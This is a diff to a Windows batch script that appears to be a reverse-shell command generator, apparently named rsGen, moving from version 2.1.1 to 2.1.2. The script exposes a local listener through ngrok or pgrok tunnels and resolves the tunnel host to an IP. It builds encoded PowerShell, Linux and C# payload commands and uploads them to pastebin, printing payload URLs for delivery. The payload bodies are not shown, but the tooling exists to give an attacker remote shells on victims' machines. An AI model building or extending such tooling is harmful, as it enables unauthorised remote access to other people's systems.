@@ -26,7 +26,6 @@ if "%~1" equ "" (
         )
         goto rs_help_start
     ) else (
-        set rs_listen_port=
         set rs_listen_port=%~2
 
         if /i "%2"=="-ngrok" (
@@ -45,11 +44,11 @@ if "%~1" equ "" (
             if !rs_ngrok! == 0 ( 
                 call :rs_command_generate_pub_start !rs_ngrok_host! !rs_ngrok_port!
             ) else (
-                powershell -c write-host "' - Get ngrok tunnel url timeout.'" -f red -n 2>nul
+                powershell -c write-host "' - Get ngrok tunnel url timeout,Please make sure you are connected to the internet and try again.'" -f red -n 2>nul
                 echo,
                 goto :eof 
             )
-    
+
             if "!rs_os_flag!"=="W10" (
                 call :rs_info_w10windows_start
                 call :rs_windows_command_raw_start !rs_ngrok_host! !rs_ngrok_port!
@@ -59,6 +58,7 @@ if "%~1" equ "" (
                 call :rs_command_generate_pub_output_linuxw10_start
                 call :rs_info_wlinux10_start
                 call :rs_command_generate_pub_output_wl10_start
+                goto :eof
             ) else (
                 call :rs_info_w7windows_start
                 call :rs_windows_command_raw_start !rs_ngrok_host! !rs_ngrok_port!
@@ -68,6 +68,7 @@ if "%~1" equ "" (
                 call :rs_command_generate_pub_output_linuxw7_start
                 call :rs_info_wlinux7_start
                 call :rs_command_generate_pub_output_wl7_start
+                goto :eof
             )
 
         ) 
@@ -102,6 +103,7 @@ if "%~1" equ "" (
                 call :rs_command_generate_pub_output_linuxw10_start
                 call :rs_info_wlinux10_start
                 call :rs_command_generate_pub_output_wl10_start
+                goto :eof
             ) else (
                 call :rs_info_w7windows_start
                 call :rs_windows_command_raw_start !rs_pgrok_host! !rs_pgrok_port!
@@ -111,6 +113,7 @@ if "%~1" equ "" (
                 call :rs_command_generate_pub_output_linuxw7_start
                 call :rs_info_wlinux7_start
                 call :rs_command_generate_pub_output_wl7_start
+                goto :eof
             )
 
         ) 
@@ -293,8 +296,18 @@ if exist "%cd%\include\wincat.exe" (
 goto :eof
 :rs_local_listen_end
 
+::Convert Domain to IP
+:rs_domain2IP_start
+set rs_domain2ip=%1
+for /f "tokens=2" %%i in ('nslookup %1 8.8.8.8 2^>NUL^|findstr /i /V "dns 8.8.8 ngrok"') do (
+    set rs_domain2ip=%%i
+)
+goto :eof
+:rs_domain2IP_end
+
 ::rs_ngrok
 :rs_ngrok_start
+echo  [90mi Starting ngrok and get the forwarding address,please wait...[0m
 if exist "%cd%\include\ngrok.exe" (
     call :rs_random_token_start %cd%\include\rs_ngrok.token
     call :rs_random_location_start %cd%\include\rs_ngrok.localation
@@ -304,7 +317,7 @@ if exist "%cd%\include\ngrok.exe" (
     start "Expose a TCP based service running on port !rs_listen_port!" cmd /c %cd%\include\ngrok.exe tcp !rs_listen_port! -config=%cd%\include\ngrok.yml 2>nul
     set rs_ngrok=
     set rs_n=0
-    FOR /L %%i in (1,1,30) do (
+    FOR /L %%i in (1,1,20) do (
         set /a rs_n=!rs_n!+1
         %cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:44480/api/tunnels|find /i "ngrok.io" >nul&&set rs_ngrok=0
         if !rs_ngrok! == 0 goto :rs_ngrok_host
@@ -316,13 +329,21 @@ if exist "%cd%\include\ngrok.exe" (
         FOR /F tokens^=11^ delims^=^:^,^" %%i in ('%cd%\include\curl.exe -s --retry 3 --retry-delay 5 --retry-connrefused http://localhost:44480/api/tunnels') do (set rs_ngrok_port=%%i)
         
         set rs_listen_host=!rs_ngrok_host!
-        echo  + Starting the ngrok tcp tunnel 127.0.0.1:!rs_listen_port! ^<==^> !rs_ngrok_host!:!rs_ngrok_port!
+        echo  + Ngrok tcp tunnel 127.0.0.1:!rs_listen_port! ^<==^> !rs_ngrok_host!:!rs_ngrok_port!
         rem echo !rs_ngrok_host!
         rem echo !rs_ngrok_port!
         rem echo !rs_n! time...
-    ) 
+        call :rs_domain2IP_start !rs_ngrok_host!
+        
+        if not "!rs_domain2ip!" == "" (
+            set rs_ngrok_host=!rs_domain2ip!
+            echo                     127.0.0.1:!rs_listen_port! ^<==^> !rs_domain2ip!:!rs_ngrok_port!
+        ) else (
+            echo  [33m- Attempt to convert Ngrok domain name to IP failed.[0m
+        )
+    )
     goto :eof
-   
+
 ) else (
     echo,
     powershell -c write-host "' - Unable to start Service,Missing file %cd%\include\ngrok.exe.'" -f red -n 2>nul
@@ -370,6 +391,7 @@ goto :eof
 
 ::rs_pgrok
 :rs_pgrok_start
+echo  [90mi Starting Pgrok and get the forwarding address,please wait...[0m
 if exist "%cd%\include\pgrok.exe" (
     start "Expose a TCP based service running on port !rs_listen_port!" cmd /c %cd%\include\pgrok.exe -proto=tcp !rs_listen_port! 2>nul
    
@@ -390,6 +412,14 @@ if exist "%cd%\include\pgrok.exe" (
         echo  + Starting the pgrok tcp tunnel 127.0.0.1:!rs_listen_port! ^<==^> !rs_pgrok_host!:!rs_pgrok_port!
         rem echo "!rs_pgrok_host!"  "!rs_pgrok_port!"
         rem echo !rs_n! time...
+        call :rs_domain2IP_start !rs_pgrok_host!
+        
+        if not "!rs_domain2ip!" == "" (
+            set rs_pgrok_host=!rs_domain2ip!
+            echo                                  127.0.0.1:!rs_listen_port! ^<==^> !rs_domain2ip!:!rs_pgrok_port!
+        ) else (
+            echo  [33mi ! Attempt to convert Pgrok domain name to IP failed.[0m
+        )
     ) 
     goto :eof
 
@@ -636,7 +666,7 @@ echo,
 goto :eof
 :rs_command_generate_pub_output_wl7_end
 
-::"transfer command" generation
+::Command generation
 :rs_command_generate_pub_start
 set rs_ps_command_suf_b64=
 set rs_linux_command_b64=
@@ -664,7 +694,7 @@ goto :eof
 ::Upload command to pastebin
 :rs_command_upload_start
 set rs_pastebin_api=
-echo  * Uploading command to pastebin...
+echo  [90mi Uploading payload to pastebin,please wait...[0m
 call :rs_pastebin_api_start %cd%\include\rs_pastebin.api
 rem echo !rs_pastebin_api!
 if exist "%cd%\include\curl.exe" (
@@ -717,6 +747,13 @@ if exist "%cd%\include\curl.exe" (
     goto :rs_help_start
 )
 
+if not !rs_base64_payload_url! == "" (
+    echo  + Base64 Payload URL: !rs_base64_payload_url!
+    echo  + C# Payload URL: !rs_c#_payload_url!
+) else (
+    powershell -c write-host "' ! Attempt to convert Ngrok domain name to IP failed.'" -f red -n 2>nul
+)
+
 exit /b 0
 
 
@@ -727,7 +764,7 @@ echo                 .' ___  ^|^|_   __  ^|^|_   \^|_   _^|
 echo   _ .--.  .--. / .'   \_^|  ^| ^|_ \_^|  ^|   \ ^| ^|   
 echo  [ `/'`\]( (`\]^| ^|   ____  ^|  _^| _   ^| ^|\ \^| ^|   
 echo   ^| ^|     `'.'.\ `.___]  ^|_^| ^|__/ ^| _^| ^|_\   ^|_  
-echo  [___]   [\__) )`._____.'^|________^|^|_____^|\____^|  v2.1.1
+echo  [___]   [\__) )`._____.'^|________^|^|_____^|\____^|  v2.1.2
 echo,
 goto :eof
 :rs_banner_w7_end
@@ -738,7 +775,7 @@ echo  [93m                 .' ___  ^|^|_   __  ^|^|_   \^|_   _^| [0m
 echo  [92m   _ .--.  .--. [93m/ .'   \_^|  ^| ^|_ \_^|  ^|   \ ^| ^|   
 echo  [92m  [ `/'`\]( (`\][93m^| ^|   ____  ^|  _^| _   ^| ^|\ \^| ^|   
 echo  [92m   ^| ^|     `'.'.[93m\ `.___]  ^|_^| ^|__/ ^| _^| ^|_\   ^|_  
-echo  [92m  [___]   [\__) )[93m`._____.'^|________^|^|_____^|\____^|  [97mv2.1.1[0m
+echo  [92m  [___]   [\__) )[93m`._____.'^|________^|^|_____^|\____^|  [97mv2.1.2[0m
 echo,
 goto :eof
 :rs_banner_w10_end
